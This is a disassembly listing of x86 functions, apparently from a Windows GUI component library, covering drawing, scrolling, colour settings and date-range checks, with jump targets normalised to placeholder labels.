sub_43cb08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2b2 ] 0x0
je r-xdata
cmp [ esi + 0x2fa ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov ax [ ebp - 0x6 ]
push eax
push ebx
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2b4 ]
call [ esi + 0x2b0 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
sub_43cb78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2ba ] 0x0
je r-xdata
cmp [ esi + 0x302 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
push ebx
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2bc ]
call [ esi + 0x2b8 ]
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
sub_43cbf0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_44e448
cmp [ ebx + 0x332 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x210 ]
call sub_425224
mov eax [ esi + 0x24 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x210 ]
call sub_4253d8
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43cc68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x352 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x354 ]
call [ ebx + 0x350 ]
sub_43ccac
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43ce03
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x210 ]
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424cdc
mov eax [ ebx + 0x290 ]
call sub_419720
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ce0a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4040d0
retn
inc eax
mov [ ebp - 0xc ] eax
xor edi edi
inc edi
dec [ ebp - 0xc ]
jne r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_4249bc
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_437fe8
mov edx [ eax + 0x20 ]
mov eax [ esi + 0xc ]
call sub_4243f4
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_437fe8
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4253d8
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_437fe8
mov edx [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
call sub_4248e0
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_4249bc
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43bf54
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43bf54
mov eax [ ebp - 0x20 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_437fe8
push esi
push edi
lea esi [ eax + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_406160
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_425328
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_437fe8
lea edx [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_43ce14
push ebx
mov ebx eax
mov eax ebx
call sub_4541e4
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
pop ebx
retn
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_43ccac
sub_43ce48
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cf61
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x35a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451bb8
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_43c330
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cf68
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
call sub_404144
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10c ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_438910
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44f36c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_44f36c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push edi
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax 0x38
mov edx [ ebp - 0x8 ]
call sub_404100
push 0xe
call GetSystemMetrics
add eax [ edi + 0x1c ]
mov [ edi + 0xc ] eax
push 0xd
call GetSystemMetrics
add eax [ edi + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44f258
mov edx [ esi + 0x8 ]
mov [ edx + 0x10 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43cf90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43cfb4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_456054
mov edx esi
call sub_42a9b8
sub_43cfc8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov al [ ebx + 0x244 ]
xor al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
pop ebx
retn
sub_43d000
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_43c330
test eax eax
jne r-xdata
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_451194
cmp [ ebx + 0x230 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43d044
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x23c ]
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x23c ]
mov edx esi
call sub_437d4c
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_43d080
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
call sub_4173bc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_457154
add esp 0x20
pop esi
pop ebx
retn
mov eax ebx
call sub_43c154
test eax eax
je r-xdata
mov eax ebx
call sub_43c154
lea ecx [ esp + 0x10 ]
mov dl 0x3
call sub_438910
lea eax [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
call sub_406194
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_44f36c
mov eax esp
call sub_406cf0
mov [ esi + 0x8 ] eax
sub_43d0f8
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_438a7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_438aac
xor ecx ecx
mov edx 0x3
call sub_438608
inc esi
dec ebx
jne r-xdata
sub_43d134
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x22c ]
call sub_438a7c
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_438aac
mov eax [ eax + 0xc ]
push eax
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_438aac
mov edx [ eax + 0x24 ]
mov eax [ esp + 0x4 ]
pop ecx
mov ebp [ eax ]
call [ ebp + 0xd4 ]
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_438aac
mov edx 0x3
call sub_4385a0
test al al
je r-xdata
sub_43d1a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438b90
xor eax eax
push ebp
push sub_43d241
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438a7c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d248
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438d6c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_438aac
mov edx 0x3
call sub_4385a0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_438aac
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034ac
sub_43d25c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_438a7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_438aac
mov cl 0x1
mov edx 0x3
call sub_438608
inc esi
dec ebx
jne r-xdata
sub_43d298
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438b90
xor eax eax
push ebp
push sub_43d2e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438b70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d2ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438d6c
retn
sub_43d2f8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_456b24
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43c014
cmp [ edi + 0x21c ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43d35c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_440198
call sub_440278
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4543f8
push 0x1
mov eax ebx
call sub_456054
push eax
call GetScrollPos
mov edi eax
mov edx esi
mov eax ebx
call sub_4543f8
push 0x1
mov eax ebx
call sub_456054
push eax
call GetScrollPos
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_456054
push eax
call InvalidateRect
jmp r-xdata
sub_43d3c0
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xff000005
mov [ eax + 0xc ] 0xff000008
mov [ eax + 0x10 ] 0xff000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0xff000013
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_43d410
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43d501
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403200
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404310
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403200
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d508
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_43d51c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_456358
test al al
je r-xdata
jmp [ eax * 4 + jump_table_43d533 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_423f34
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd8 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_43d594
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_43d51c
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_43d51c
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_43d51c
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_43d51c
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_43d51c
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_43d51c
pop ebx
retn
sub_43d5f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_43612c
mov ecx esi
xor edx edx
mov eax edi
call sub_451d80
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d3c0
mov [ edi + 0x208 ] eax
call sub_409cc8
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_43d68c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451ea4
mov eax [ esi + 0x208 ]
call sub_4032b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_43d6c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43d7c1
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d7c8
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4040d0
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a988
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb18
call sub_403a64
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40a988
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb18
call sub_403a64
sub_43d7d4
push ebx
mov ebx eax
mov eax ebx
call sub_45300c
mov eax [ ebx + 0x208 ]
call sub_43d594
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43ddb0
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_43dc38
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_43dd74
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_43dae4
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43d9d4
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43df00
pop ebx
retn
sub_43d870
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_43d91c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409d18
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_43d9a1
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_402ac8
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d9d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43d9d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409bf0
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43df00
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_43da5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_402ac8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_402ac8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_43d8ec
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_43df00
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43dae4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_456358
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx edi
call sub_42aa08
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
sub_43db4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43dc24
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dc2b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43ddb0
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40a988
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb18
call sub_403a64
sub_43dc38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42a9d8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_43dc88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43dd60
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dd67
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43ddb0
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a988
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
